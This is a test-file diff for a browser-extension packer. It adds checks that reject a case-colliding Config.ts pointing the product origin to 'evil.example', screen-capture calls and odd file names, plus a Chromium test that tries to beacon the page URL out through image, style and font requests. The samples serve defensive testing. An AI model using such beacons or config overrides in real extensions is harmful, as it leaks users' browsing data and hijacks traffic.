@@ -81,6 +81,11 @@ describe("the packer", { skip: hasModules ? false : "needs template/node_modules
       [{ "extension/popup.ts": 'fetch("https://elsewhere.example");\nexport {};\n' }, /popup\.js uses fetch\(\)/],
       [{ "extension/popup.ts": 'import { h } from "preact";\nconsole.log(h);\nexport {};\n' }, /imports "preact"/],
       [{ "extension/run.sh": "echo hi\n" }, /isn't a file an extension may ship/],
+      // Names that land on the platform's files once unzipped on a Mac or Windows disk, which ignores capital letters.
+      [{ "extension/Config.ts": "export const PRODUCT_ORIGIN = 'https://evil.example';\n" }, /extension\/Config\.js would replace the platform's config\.js/],
+      [{ "extension/config.js/x.ts": "export {};\n" }, /extension\/config\.js\/x\.js is in a folder named like the file config\.js/],
+      [{ "extension/_x.ts": "export {};\n" }, /extension\/_x\.ts isn't a file an extension may ship/],
+      [{ "extension/popup.ts": "const shot = await chrome.tabs.captureVisibleTab();\nexport {};\n" }, /captureVisibleTab, which takes a picture of the page/],
     ];
     for (const [files, want] of cases) {
       const res = pack(product(files), "check");
@@ -209,7 +214,22 @@ describe("the extension in Chromium", { skip: chromiumProblem ?? false }, () => 
       const otherPort = other.address().port;
       const blocked = await popup.evaluate((port) => fetch(`http://127.0.0.1:${port}/x`).then(() => "reached", () => "blocked"), otherPort);
       assert.equal(blocked, "blocked");
-      assert.ok(!hits.some((h) => String(h.url).startsWith("other:")), "nothing reached the other address");
+      // Nor carry page data out in an image, a style or a font, which a fetch-only policy would let through.
+      await popup.evaluate(async (port) => {
+        const other = `http://127.0.0.1:${port}`;
+        await new Promise((resolve) => {
+          const img = new Image();
+          img.onload = img.onerror = resolve;
+          img.src = `${other}/img?u=${encodeURIComponent(location.href)}`;
+        });
+        const div = document.createElement("div");
+        div.style.backgroundImage = `url(${other}/style)`;
+        document.body.append(div);
+        void getComputedStyle(div).backgroundImage;
+        await new FontFace("Beacon", `url(${other}/font)`).load().catch(() => undefined);
+      }, otherPort);
+      await popup.waitForTimeout(500);
+      assert.ok(!hits.some((h) => String(h.url).startsWith("other:")), `nothing reached the other address: ${JSON.stringify(hits.filter((h) => String(h.url).startsWith("other:")))}`);
     } finally {
       await ext.close();
     }
